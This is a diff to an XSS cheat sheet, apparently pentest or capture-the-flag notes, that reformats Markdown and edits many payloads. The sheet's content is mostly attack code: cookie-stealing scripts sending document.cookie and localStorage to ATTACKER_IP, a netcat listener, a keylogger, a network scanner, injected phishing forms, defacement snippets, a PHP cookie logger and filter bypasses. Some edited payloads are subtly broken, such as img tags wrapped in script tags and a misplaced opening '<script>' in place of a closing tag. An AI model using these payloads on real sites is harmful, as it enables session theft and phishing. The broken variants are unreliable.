@@ -1,14 +1,14 @@
-# XSS
+# Testing for XSS
 
 ## XSS Types
 
-| Type | Description |
-|------|-------------|
-| **Stored (Persistent)** | Input stored in DB, displayed to all users (most critical) |
+| Type                           | Description                                                |
+| ------------------------------ | ---------------------------------------------------------- |
+| **Stored (Persistent)**        | Input stored in DB, displayed to all users (most critical) |
 | **Reflected (Non-Persistent)** | Input reflected in response (e.g., search, error messages) |
-| **DOM-based** | Processed client-side via JavaScript, never reaches server |
+| **DOM-based**                  | Processed client-side via JavaScript, never reaches server |
 
----
+***
 
 ## Test ALL Input Fields
 
@@ -16,15 +16,15 @@
 
 ### Fields to Test
 
-- Username/login fields
-- Message/comment body
-- **Phone number** - Often unfiltered, expecting only digits
-- **Email address** - May allow special characters
-- Subject/title fields
-- Search boxes
-- Hidden form fields
-- File name fields
-- Contact form fields (name, company, etc.)
+* Username/login fields
+* Message/comment body
+* **Phone number** - Often unfiltered, expecting only digits
+* **Email address** - May allow special characters
+* Subject/title fields
+* Search boxes
+* Hidden form fields
+* File name fields
+* Contact form fields (name, company, etc.)
 
 ### Example: Phone Field XSS
 
@@ -36,13 +36,13 @@ A contact form may filter the message body for XSS but leave the phone number fi
 <!-- Returns: "Oops! Someone is trying to do something nasty..." -->
 
 <!-- Unfiltered in phone field -->
-<script>var i=new Image; i.src="http://ATTACKER/?"+document.cookie;</script>
+<script>var i=new Image; i.src="http://ATTACKER/steal.php?c="+document.cookie;</script>
 <!-- Works! Cookie sent to attacker -->
 ```
 
 **Tip:** If one field is filtered, try the same payload in every other field. Developers often focus filtering on expected attack surfaces and miss unexpected ones.
 
----
+***
 
 ## Test Payloads
 
@@ -57,17 +57,17 @@ A contact form may filter the message body for XSS but leave the phone number fi
 ```html
 <script>confirm(1)</script>
 <script>prompt(1)</script>
-<img src=x onerror=confirm(1)>
-<img src=x onerror=prompt(1)>
+<script><img src=x onerror=confirm(1)></script>
+<script><img src=x onerror=prompt(1)></script>
 ```
 
 ### DOM XSS (when script tags blocked)
 
 ```html
-<img src="" onerror=alert(window.origin)>
+<script><img src="" onerror=alert(window.origin)></script>
 ```
 
----
+***
 
 ## XSS Discovery Tools
 
@@ -83,7 +83,7 @@ python xsstrike.py -u "http://TARGET/page.php?param=test"
 # - XSSer: https://github.com/epsylon/xsser
 ```
 
----
+***
 
 ## Reflected XSS Exploitation
 
@@ -95,7 +95,7 @@ python xsstrike.py -u "http://TARGET/page.php?param=test"
 http://TARGET/search.php?q=<script>alert(1)</script>
 ```
 
----
+***
 
 ## DOM XSS - Source & Sink
 
@@ -125,11 +125,13 @@ after()
 add()
 ```
 
----
+***
 
 ## Stored XSS
+
 ### Key Logger
-````
+
+```
 <script type="text/javascript">
  let l = ""; // Variable to store key-strokes in
  document.onkeypress = function (e) { // Event to listen for key presses
@@ -137,30 +139,44 @@ add()
    console.log(l); // update this line to post to your own server
  }
 </script> 
-````
+```
+
 ### Chat Room XSS
-- Start a netcat listener on your attack box
-````
+
+* Start a netcat listener on your attack box
+
+```
 nc -nlvp 4444
-````
-- Take this XSS payload and paste it in the chat room and submit:
-````
+```
+
+* Take this XSS payload and paste it in the chat room and submit:
+
+```
 <script>window.location='http://10.13.**.**:4444/?cookie='+document.cookie</script>
-````
-- Note: Send the payload and then open the listener 
+```
+
+* Note: Send the payload and then open the listener
+
 ## Stored XSS Payloads
-- Stored XSS pop up to display your cookies, good for a POC
-````
+
+* Stored XSS pop up to display your cookies, good for a POC
+
+```
 <script>alert(document.cookie)</script>
-````
-- Adding HTML to a website
-````
+```
+
+* Adding HTML to a website
+
+```
 <title>Example document: XSS Doc</title>
-````
-- Deface website title. You will need inspect element and find the name of the element you want to change. `thm-title` is the element name in this example.
-````
+```
+
+* Deface website title. You will need inspect element and find the name of the element you want to change. `thm-title` is the element name in this example.
+
+```
 <script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>
-````
+```
+
 ## DOM-Based XSS
 
 ### Internal Network Scanner
@@ -175,7 +191,7 @@ for (let i = 0; i < 256; i++) {
 </script>
 ```
 
----
+***
 
 ## Website Defacing
 
@@ -204,7 +220,7 @@ for (let i = 0; i < 256; i++) {
 document.getElementById('elementId').remove();
 ```
 
----
+***
 
 ## XSS Phishing
 
@@ -220,7 +236,7 @@ document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP
 ...PAYLOAD... <!--
 ```
 
----
+***
 
 ## Session Hijacking / Cookie Stealing
 
@@ -228,10 +244,10 @@ document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP
 
 ```javascript
 // Redirect method
-document.location='http://ATTACKER_IP/steal.php?c='+document.cookie;
+<script>document.location='http://ATTACKER_IP/steal.php?c='+document.cookie;</script>
 
 // Image method (stealthier)
-new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie;
+<script>new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie;<script>
 ```
 
 ### PHP Cookie Logger (steal.php)
@@ -262,7 +278,7 @@ mkdir /tmp/tmpserver && cd /tmp/tmpserver
 sudo php -S 0.0.0.0:80
 ```
 
----
+***
 
 ## Blind XSS Detection
 
@@ -286,22 +302,22 @@ sudo php -S 0.0.0.0:80
 ### script.js for Cookie Stealing
 
 ```javascript
-new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie
+<script>new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie</script>
 ```
 
----
+***
 
 ## Common Injection Contexts
 
-| Context | Payload |
-|---------|---------|
+| Context           | Payload                          |
+| ----------------- | -------------------------------- |
 | Inside `<script>` | `';alert(1)//` or `";alert(1)//` |
-| HTML attribute | `" onmouseover=alert(1)` |
-| HTML tag | `<img src=x onerror=alert(1)>` |
-| URL parameter | `javascript:alert(1)` |
-| Event handler | `'-alert(1)-'` |
+| HTML attribute    | `" onmouseover=alert(1)`         |
+| HTML tag          | `<img src=x onerror=alert(1)>`   |
+| URL parameter     | `javascript:alert(1)`            |
+| Event handler     | `'-alert(1)-'`                   |
 
----
+***
 
 ## Bypass Techniques
 
@@ -322,7 +338,7 @@ new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie
 
 ```html
 <script>alert`1`</script>
-<img src=x onerror=alert`1`>
+<script><img src=x onerror=alert`1`></script>
 ```
 
 ### No Quotes
@@ -331,7 +347,7 @@ new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie
 <script>alert(String.fromCharCode(88,83,83))</script>
 ```
 
----
+***
 
 ## Filter Bypass Payloads
 
@@ -345,7 +361,7 @@ new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie
 <details open ontoggle=alert(1)>
 ```
 
----
+***
 
 ## XSS in Markdown
 
@@ -373,7 +389,7 @@ Markdown parsers that allow HTML can be vulnerable to XSS.
 
 **Reference:** https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt
 
----
+***
 
 ## XSS Data Exfiltration via fetch()
 
@@ -432,57 +448,3 @@ echo "PHByZT5hbGJlcnQ6JGFwcjEk..." | base64 -d
 new Image().src='http://ATTACKER_IP/steal.php?c='+btoa(JSON.stringify(localStorage));
 </script>
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
